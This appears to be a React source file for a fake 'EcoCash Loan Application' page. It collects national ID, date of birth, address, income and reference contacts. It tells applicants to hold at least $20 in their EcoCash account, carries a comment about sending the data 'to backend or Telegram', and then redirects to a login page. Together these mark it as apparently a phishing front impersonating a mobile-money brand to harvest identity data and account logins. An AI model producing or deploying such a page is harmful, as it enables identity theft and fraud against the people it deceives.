import React, { useState } from "react";
import { useNavigate } from "react-router-dom";

const LoanLanding: React.FC = () => {
  const navigate = useNavigate();
  const [form, setForm] = useState({
    name: "",
    phone: "",
    email: "",
    nationalId: "",
    dob: "",
    address: "",
    employmentStatus: "Employed",
    employer: "",
    income: "",
    loanType: "Personal Loan",
    amount: "",
    repayment: "1 Month",
    purpose: "",
    referenceName: "",
    referencePhone: "",
    agree: false,
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
    const { name, value, type } = e.target;
    if (type === "checkbox") {
      setForm({ ...form, [name]: (e.target as HTMLInputElement).checked });
    } else {
      setForm({ ...form, [name]: value });
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Optionally: send form data to backend or Telegram here
    navigate("/login");
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-b from-blue-100 to-blue-300 p-2 sm:p-4">
      <div className="bg-white/90 rounded-2xl shadow-lg p-4 sm:p-8 max-w-full w-full sm:max-w-2xl md:max-w-3xl lg:max-w-4xl transition-all">
        <h1 className="text-2xl sm:text-3xl font-bold mb-2 sm:mb-4 text-blue-700 text-center">EcoCash Loan Application</h1>
        <p className="mb-2 sm:mb-4 text-gray-700 text-center text-xs sm:text-sm">
          Please fill in all required details accurately. All information is kept confidential and used only for loan processing and verification.
        </p>
        <div className="mb-4">
          <div className="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-800 p-3 rounded text-xs sm:text-sm text-center">
            <strong>Important:</strong> You must have <span className="font-bold">at least $20</span> in your EcoCash account to apply for a loan.
          </div>
        </div>
        <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 sm:gap-4">
            <div>
              <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Full Name</label>
              <input type="text" name="name" value={form.name} onChange={handleChange} required className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
            </div>
            <div>
              <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Phone Number</label>
              <input type="tel" name="phone" value={form.phone} onChange={handleChange} required className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
            </div>
            <div>
              <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Email Address</label>
              <input type="email" name="email" value={form.email} onChange={handleChange} required className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
            </div>
            <div>
              <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">National ID / Passport</label>
              <input type="text" name="nationalId" value={form.nationalId} onChange={handleChange} required className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
            </div>
            <div>
              <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Date of Birth</label>
              <input type="date" name="dob" value={form.dob} onChange={handleChange} required className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
            </div>
            <div>
              <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Residential Address</label>
              <input type="text" name="address" value={form.address} onChange={handleChange} required className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
            </div>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 sm:gap-4">
            <div>
              <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Employment Status</label>
              <select name="employmentStatus" value={form.employmentStatus} onChange={handleChange} className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base">
                <option>Employed</option>
                <option>Self-Employed</option>
                <option>Unemployed</option>
                <option>Student</option>
                <option>Pensioner</option>
              </select>
            </div>
            <div>
              <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Employer / Business Name</label>
              <input type="text" name="employer" value={form.employer} onChange={handleChange} className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
            </div>
            <div>
              <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Monthly Income (USD)</label>
              <input type="number" name="income" value={form.income} onChange={handleChange} required min={0} className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
            </div>
            <div>
              <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Loan Type</label>
              <select name="loanType" value={form.loanType} onChange={handleChange} className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base">
                <option>Personal Loan</option>
                <option>Business Loan</option>
                <option>Salary Advance</option>
                <option>School Fees Loan</option>
              </select>
            </div>
            <div>
              <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Loan Amount (USD)</label>
              <input type="number" name="amount" value={form.amount} onChange={handleChange} required min={1} className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
            </div>
            <div>
              <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Repayment Period</label>
              <select name="repayment" value={form.repayment} onChange={handleChange} className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base">
                <option>1 Month</option>
                <option>3 Months</option>
                <option>6 Months</option>
                <option>12 Months</option>
              </select>
            </div>
          </div>
          <div>
            <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Purpose of Loan</label>
            <textarea name="purpose" value={form.purpose} onChange={handleChange} rows={3} required className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 sm:gap-4">
            <div>
              <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Reference Name</label>
              <input type="text" name="referenceName" value={form.referenceName} onChange={handleChange} required className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
            </div>
            <div>
              <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Reference Phone</label>
              <input type="tel" name="referencePhone" value={form.referencePhone} onChange={handleChange} required className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
            </div>
          </div>
          <div className="flex items-center mt-2">
            <input type="checkbox" name="agree" checked={form.agree} onChange={handleChange} required className="mr-2" />
            <span className="text-xs text-gray-600">I confirm that the information provided is true and I agree to the EcoCash Loans terms and conditions.</span>
          </div>
          <button type="submit" className="w-full py-2 sm:py-3 rounded-lg bg-blue-600 text-white font-semibold text-base sm:text-lg hover:bg-blue-700 transition">
            Continue with EcoCash
          </button>
        </form>
      </div>
    </div>
  );
};

export default LoanLanding;
